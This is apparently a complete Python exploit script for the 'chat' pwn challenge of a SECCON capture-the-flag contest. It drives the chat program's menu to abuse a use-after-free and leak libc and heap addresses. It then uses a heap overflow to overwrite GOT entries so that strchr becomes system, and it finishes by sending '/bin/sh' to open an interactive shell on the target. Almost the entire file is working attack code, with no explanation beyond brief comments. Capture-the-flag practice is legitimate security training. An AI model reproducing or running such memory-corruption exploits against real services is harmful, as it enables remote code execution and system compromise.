#!/usr/bin/env python
# socat -v tcp-listen:8080,fork,reeaddr exec:./chat,stderr
from sc_pwn import *

str_pname   = './chat'

env = Environment('local', 'remote')
env.set_item('mode',    local   = 'LOCAL', \
                        remote  = 'SOCKET')
env.set_item('target',  local   = {'program':str_pname}, \
                        remote  = {'host':'chat.pwn.seccon.jp','port':26895})
env.set_item('libc',    local   = lib_path(str_pname, 'libc.so.6'), \
                        remote  = '../libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e')
env.select()

libc = ELF(env.libc)
binf = ELF(str_pname)
addr_got_main       = binf.got('__libc_start_main')
addr_got_malloc     = binf.got('malloc')
addr_got_strchr     = binf.got('strchr')

addr_user_tbl       = binf.symbol('user_tbl')

str_sh              = '/bin/sh'

#==========
def attack(cmn):
    chat = Chat(cmn)

    chat.signup('Hoge')
    chat.signup('A'*0x18)
    chat.signup('B'*0x18)
    
    chat.signin('B'*0x18)
    chat.send_dm('Hoge', 'DirectMessage1')
    chat.change_name('')
    
    chat.signin('A'*0x18)
    chat.change_name('')

    #===== leak libc addr =====
    chat.signup(pack_64(addr_got_main))
    
    chat.signin('Hoge')
    addr_libc_main = chat.show_dm()[0][0]           # Use After Free
    addr_libc_main = unpack_64(addr_libc_main+'\x00'*(8-len(addr_libc_main)))
    libc.set_location('__libc_start_main', addr_libc_main)
    addr_libc_malloc    = libc.function('malloc')
    addr_libc_system    = libc.function('system')
    addr_libc_strchr    = libc.symbol('strchr') + 0x30
    addr_libc_ret       = libc.base + 0x937
    chat.signout()

    #===== leak heap addr =====
    chat.signin(pack_64(addr_got_main))
    chat.change_name(pack_64(addr_user_tbl+(ord('h')-ord('a')+1)*0x8))
    chat.signout()

    chat.signin('Hoge')
    addr_heap = chat.show_dm()[0][0]                # Use After Free
    addr_heap_base      = unpack_64(addr_heap+'\x00'*(8-len(addr_heap))) - 0x10
    info('addr_heap_base    = 0x%08x' % addr_heap_base)
    chat.send_pm('PublicMessage1')
    chat.signout()

    #===== GOT overwrite =====
    # SIGNUP : user A
    chat.signup('Fuga')
    
    # user A
    exploit_st1  = pack_64(addr_heap_base+0x270)
    exploit_st1 += pack_64(addr_heap_base+0x278)
    exploit_st1 += pack_64(0x20)
    exploit_st1 += '\xa0'
    
    chat.signin('Fuga')
    chat.send_pm('a'*0x8+pack_64(addr_heap_base+0x240))
    chat.change_name_null(exploit_st1)              # Heap Over Flow
    chat.remove_pm(2)
    chat.signout()

    # SIGNUP : user B
    chat.signup('Piyo')
    chat.signup(chr(addr_libc_malloc&0xff))

    # user A
    chat.signin(pack_64(addr_heap_base+0x270))
    chat.change_name(pack_64(addr_got_malloc))
    chat.signout()
    
    # user B
    exploit_st2  = chr(addr_libc_strchr&0xff)
    exploit_st2 += ' '*7
    exploit_st2 += pack_64(addr_libc_ret)           # isprint@got.plt -> ret
    
    chat.signin(pack_64(addr_libc_malloc))
    chat.change_name(exploit_st2)
    chat.signout()

    # user A
    chat.signin(pack_64(addr_got_malloc))
    chat.change_name(pack_64(addr_got_strchr))
    chat.signout()

    # user B
    chat.signin(pack_64(addr_libc_strchr))
    chat.change_name(pack_64(addr_libc_system))     # strchr@got.plt -> system

    # system("/bin/sh")
    cmn.read_until('menu >> ')
    cmn.sendln(str_sh)
    
class Chat:
    def __init__(self, cmn):
        self.signed     = False
        self.read_until = cmn.read_until
        self.sendln     = cmn.sendln

    def signup(self, name):
        if self.signed:
            return
        self.read_until('menu > ')
        self.sendln('1')
        self.read_until('name > ')
        self.sendln(name)

    def signin(self, name):
        if self.signed:
            return
        self.read_until('menu > ')
        self.sendln('2')
        self.read_until('name > ')
        self.sendln(name)
        self.signed = True

    def signout(self):
        if not self.signed:
            return
        self.read_until('menu >> ')
        self.sendln('0')
        self.signed = False

    def show_pm(self):
        if not self.signed:
            return
        self.read_until('menu >> ')
        self.sendln('1')
        self.read_until('Time Line\n')
        r = re.compile('\([0-9]{3}\)\[(.+)\] (.+)')
        return r.findall(cmn.read_until('Done.'))

    def show_dm(self):
        if not self.signed:
            return
        self.read_until('menu >> ')
        self.sendln('2')
        self.read_until('Direct Messages\n')
        r = re.compile('\[(.+)\] (.+)')
        return r.findall(cmn.read_until('Done.'))
        
    def send_pm(self, msg):
        if not self.signed:
            return
        self.read_until('menu >> ')
        self.sendln('4')
        self.read_until('message >> ')
        self.sendln(msg)

    def send_dm(self, name, msg):
        if not self.signed:
            return
        self.read_until('menu >> ')
        self.sendln('5')
        self.read_until('name >> ')
        self.sendln(name)
        if 'message' in self.read_until(' '):
            self.sendln(msg)
        
    def remove_pm(self, id):
        if not self.signed:
            return
        self.read_until('menu >> ')
        self.sendln('6')
        self.read_until('id >> ')
        self.sendln(str(id))

    def change_name(self, name):
        if not self.signed:
            return
        self.read_until('menu >> ')
        self.sendln('7')
        self.read_until('name >> ')
        self.sendln(name)
        if 'error' in self.read_until():
            self.signed = False

    def change_name_null(self, s):
        while s:
            idx = s.rfind('\x00')
            if idx<len(s)-1:
                self.change_name('@'*(idx+1)+s[idx+1:])
    
            s = '' if idx==-1 else s[:idx]
            
            if s and s[-1]=='\0':
                self.change_name('@'*idx)
        
#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
